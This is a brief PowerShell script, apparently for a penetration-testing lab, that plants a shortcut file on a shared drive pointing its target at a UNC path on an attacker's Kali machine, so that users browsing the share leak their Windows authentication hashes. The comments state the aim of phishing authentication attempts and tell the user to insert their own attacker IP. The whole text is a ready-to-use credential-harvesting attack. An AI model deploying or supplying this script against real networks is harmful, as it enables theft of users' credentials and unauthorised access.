#Create a link on a share drive to phish auth attempts
#Change the TargetPath to your Kali VM's IP
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\Shares\hackme\test.lnk")
$lnk.TargetPath = "\\192.168.0.23\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()